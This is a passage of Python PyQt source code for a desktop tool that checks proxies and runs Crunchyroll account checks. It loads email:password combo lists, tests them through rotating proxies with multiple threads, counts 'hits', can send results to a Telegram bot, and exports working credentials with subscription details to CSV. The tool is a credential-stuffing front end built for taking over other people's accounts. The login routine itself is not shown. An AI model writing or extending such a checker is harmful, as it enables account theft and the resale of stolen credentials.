        time_item = QTableWidgetItem(str(result.get('time','')))
        time_item.setTextAlignment(Qt.AlignRight)
        self.proxy_table.setItem(row, 4, time_item)
        self.proxy_table.setItem(row, 5, QTableWidgetItem(result.get('anonymity','')))
        http = '✅' if result.get('http') else '❌'
        https = '✅' if result.get('https') else '❌'
        self.proxy_table.setItem(row, 6, QTableWidgetItem(http))
        self.proxy_table.setItem(row, 7, QTableWidgetItem(https))
        status = 'Working' if result.get('working') else f'Failed: {result.get("error","")}'
        self.proxy_table.setItem(row, 8, QTableWidgetItem(status))
        color = QColor(0,80,0) if result.get('working') else QColor(80,0,0)
        for col in range(9):
            self.proxy_table.item(row,col).setBackground(color)
        self.proxy_results.append(result)

        max_rows = self.proxy_max_rows_spin.value()
        if self.proxy_table.rowCount() > max_rows:
            self.proxy_table.removeRow(0)
            if len(self.proxy_results) > max_rows:
                self.proxy_results.pop(0)

    def clear_proxy_results(self):
        self.proxy_table.setRowCount(0)
        self.proxy_results.clear()
        self.proxy_progress.setValue(0)
        self.proxy_working = 0
        self.proxy_stats.setText('Total: 0 | Working: 0 | Failed: 0')
        self.proxy_text.clear()
        gc.collect()

    def copy_working_proxies(self):
        working = [r['proxy'] for r in self.proxy_results if r['working']]
        if working:
            QApplication.clipboard().setText('\n'.join(working))
            QMessageBox.information(self, 'Success', f'Copied {len(working)} proxies.')
        else:
            QMessageBox.information(self, 'Info', 'No working proxies.')

    def save_working_proxies(self):
        working = [r['proxy'] for r in self.proxy_results if r['working']]
        if not working:
            QMessageBox.information(self, 'Info', 'No working proxies.')
            return
        fname, _ = QFileDialog.getSaveFileName(self, 'Save Working Proxies', 'working_proxies.txt', 'Text Files (*.txt)')
        if fname:
            with open(fname, 'w') as f:
                f.write('\n'.join(working))
            QMessageBox.information(self, 'Success', f'Saved {len(working)} proxies.')

    # ---------- Crunchyroll Checking ----------
    def start_crunchyroll_check(self):
        accounts = []
        invalid = 0
        for line in self.crunchyroll_accounts_text.toPlainText().splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                invalid += 1
                continue
            if ':' in line:
                email, pwd = line.split(':', 1)
                accounts.append((email.strip(), pwd.strip()))
            else:
                invalid += 1

        if invalid > 0:
            self.log(f"⚠️ Skipped {invalid} invalid lines during check.")
        if not accounts:
            QMessageBox.warning(self, 'Warning', 'No valid accounts found.')
            return

        proxies = []
        proxy_text = self.crunchyroll_proxy_text.toPlainText().strip()
        if proxy_text:
            proxies = [l.strip() for l in proxy_text.splitlines() if l.strip() and not l.startswith('#')]

        self.crunchyroll_total = len(accounts)
        self.crunchyroll_progress.setMaximum(self.crunchyroll_total)
        self.crunchyroll_progress.setValue(0)
        self.crunchyroll_results.clear()
        self.crunchyroll_table.setRowCount(0)
        self.crunchyroll_hits = self.crunchyroll_bad = 0
        self.update_crunchyroll_stats()

        self.crunchyroll_start_btn.setEnabled(False)
        self.crunchyroll_stop_btn.setEnabled(True)
        self.crunchyroll_accounts_text.setReadOnly(True)
        self.crunchyroll_proxy_text.setReadOnly(True)

        tg_token = self.crunchyroll_tg_token.text().strip() if self.crunchyroll_tg_checkbox.isChecked() else None
        tg_chat_id = self.crunchyroll_tg_chat_id.text().strip() if self.crunchyroll_tg_checkbox.isChecked() else None
        send_tg = self.crunchyroll_tg_checkbox.isChecked() and tg_token and tg_chat_id

        delay_ms = self.crunchyroll_delay_spin.value()

        self.current_checker_start_time = time.time()
        self.status_label.setText("🟢 CRUNCHYROLL CHECK RUNNING")
        self.status_label.setStyleSheet("color: #2ECC71;")

        if self.music_player and self.music_file and not self.music_playing:
            self.play_music()

        self.crunchyroll_thread = CrunchyrollCheckerThread(
            accounts, proxies,
            self.crunchyroll_threads_spin.value(),
            self.crunchyroll_retries_spin.value(),
            tg_token, tg_chat_id, send_tg,
            delay_ms
        )
        self.crunchyroll_thread.progress.connect(self.update_crunchyroll_progress)
        self.crunchyroll_thread.result_ready.connect(self.add_crunchyroll_result)
        self.crunchyroll_thread.finished.connect(self.crunchyroll_check_finished)
        self.crunchyroll_thread.log_message.connect(self.log)
        self.crunchyroll_thread.start()

    def stop_crunchyroll_check(self):
        if self.crunchyroll_thread and self.crunchyroll_thread.isRunning():
            self.crunchyroll_thread.stop()
            self.crunchyroll_thread.wait()
            self.crunchyroll_check_finished()

    def crunchyroll_check_finished(self):
        self.crunchyroll_start_btn.setEnabled(True)
        self.crunchyroll_stop_btn.setEnabled(False)
        self.crunchyroll_accounts_text.setReadOnly(False)
        self.crunchyroll_proxy_text.setReadOnly(False)
        self.status_label.setText("🟡 CRUNCHYROLL CHECK FINISHED")
        self.status_label.setStyleSheet("color: #F99F1B;")
        self.current_checker_start_time = None
        if self.crunchyroll_progress.maximum() > 0:
            self.crunchyroll_progress.setValue(self.crunchyroll_progress.maximum())
        self.log("✅ Crunchyroll check finished.")
        gc.collect()

    def update_crunchyroll_progress(self, current, total):
        self.crunchyroll_progress.setValue(current)

    def update_crunchyroll_stats(self):
        self.crunchyroll_stats.setText(f'Total: {self.crunchyroll_total} | Hits: {self.crunchyroll_hits} | Bad: {self.crunchyroll_bad}')

    def add_crunchyroll_result(self, result):
        if result['success']:
            self.crunchyroll_hits += 1
        else:
            self.crunchyroll_bad += 1
        self.update_crunchyroll_stats()
        self.crunchyroll_results.append(result)

        row = self.crunchyroll_table.rowCount()
        self.crunchyroll_table.insertRow(row)

        self.crunchyroll_table.setItem(row, 0, QTableWidgetItem(result['email']))
        self.crunchyroll_table.setItem(row, 1, QTableWidgetItem('✅ HIT' if result['success'] else '❌ FAIL'))
        self.crunchyroll_table.setItem(row, 2, QTableWidgetItem(result.get('email_verified', '')))
        self.crunchyroll_table.setItem(row, 3, QTableWidgetItem(result.get('account_creation', '')))
        self.crunchyroll_table.setItem(row, 4, QTableWidgetItem(result.get('plan', '')))
        self.crunchyroll_table.setItem(row, 5, QTableWidgetItem(result.get('subscribable', '')))
        self.crunchyroll_table.setItem(row, 6, QTableWidgetItem(result.get('free_trial', '')))
        self.crunchyroll_table.setItem(row, 7, QTableWidgetItem(result.get('next_renewal_date', '')))
        self.crunchyroll_table.setItem(row, 8, QTableWidgetItem(result.get('is_active', '')))
        self.crunchyroll_table.setItem(row, 9, QTableWidgetItem(result.get('country', '')))
        self.crunchyroll_table.setItem(row, 10, QTableWidgetItem(result.get('capture_string', '')))

        color = QColor(0,80,0) if result['success'] else QColor(80,0,0)
        for col in range(11):
            self.crunchyroll_table.item(row, col).setBackground(color)

        max_rows = self.crunchyroll_max_rows_spin.value()
        if self.crunchyroll_table.rowCount() > max_rows:
            self.crunchyroll_table.removeRow(0)
            if len(self.crunchyroll_results) > max_rows:
                self.crunchyroll_results.pop(0)

    def clear_crunchyroll_results(self):
        self.crunchyroll_table.setRowCount(0)
        self.crunchyroll_results.clear()
        self.crunchyroll_progress.setValue(0)
        self.crunchyroll_hits = self.crunchyroll_bad = 0
        self.update_crunchyroll_stats()
        self.crunchyroll_accounts_text.clear()
        self.crunchyroll_proxy_text.clear()
        gc.collect()

    def export_crunchyroll_hits(self):
        hits = [r for r in self.crunchyroll_results if r['success']]
        if not hits:
            QMessageBox.information(self, 'Info', 'No hits to export.')
            return
        fname, _ = QFileDialog.getSaveFileName(self, 'Export Hits', 'crunchyroll_hits.csv', 'CSV Files (*.csv)')
        if fname:
            try:
                with open(fname, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Email', 'Password', 'Email Verified', 'Account Creation', 'Plan', 'Subscribable', 'Free Trial', 'Expiry', 'Active', 'Country', 'Capture String'])
                    for r in hits:
                        writer.writerow([
                            r['email'], r['password'],
                            r.get('email_verified', ''), r.get('account_creation', ''),
                            r.get('plan', ''), r.get('subscribable', ''),
                            r.get('free_trial', ''), r.get('next_renewal_date', ''),
                            r.get('is_active', ''), r.get('country', ''),
                            r.get('capture_string', '')
                        ])
                self.log(f"💾 Exported {len(hits)} hits.")
                QMessageBox.information(self, 'Success', f'Exported {len(hits)} hits.')
            except Exception as e:
                self.log(f"❌ Error exporting: {e}")
                QMessageBox.critical(self, 'Error', f'Export failed: {e}')

    # ---------- UI Update ----------
    def update_display(self):
        if self.current_checker_start_time and (self.proxy_thread or self.crunchyroll_thread):
            elapsed = time.time() - self.current_checker_start_time
            if elapsed > 0:
                if self.proxy_thread and self.proxy_thread.isRunning():
                    cpm = int((self.proxy_progress.value() / elapsed) * 60) if self.proxy_progress.value() > 0 else 0
                    self.speed_label.setText(f"⚡ CPM: {cpm}")
                    self.workers_label.setText(f"👷 Bots: {self.proxy_thread.threads}")
                elif self.crunchyroll_thread and self.crunchyroll_thread.isRunning():
                    cpm = int((self.crunchyroll_progress.value() / elapsed) * 60) if self.crunchyroll_progress.value() > 0 else 0
                    self.speed_label.setText(f"⚡ CPM: {cpm}")
                    self.workers_label.setText(f"👷 Bots: {self.crunchyroll_thread.threads}")

    def update_timer_display(self):
        if self.current_checker_start_time:
            elapsed = int(time.time() - self.current_checker_start_time)
            h, rem = divmod(elapsed, 3600)
            m, s = divmod(rem, 60)
            self.timer_label.setText(f"⏱️ Time: {h:02d}:{m:02d}:{s:02d}")
        else:
            self.timer_label.setText("⏱️ Time: 00:00:00")

    def closeEvent(self, event):
        if self.music_player and self.music_playing:
            self.music_player.stop()
        if (self.proxy_thread and self.proxy_thread.isRunning()) or (self.crunchyroll_thread and self.crunchyroll_thread.isRunning()):
            reply = QMessageBox.question(self, "Confirm Exit", "A check is still running. Exit?", QMessageBox.Yes|QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                if self.proxy_thread and self.proxy_thread.isRunning():
                    self.proxy_thread.stop()
                    self.proxy_thread.wait()
                if self.crunchyroll_thread and self.crunchyroll_thread.isRunning():
                    self.crunchyroll_thread.stop()
                    self.crunchyroll_thread.wait()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()

# ---------- Main ----------
if __name__ == '__main__':
    if hasattr(Qt, 'AA_EnableHighDpiScaling'):
        QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
    if hasattr(Qt, 'AA_UseHighDpiPixmaps'):
        QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())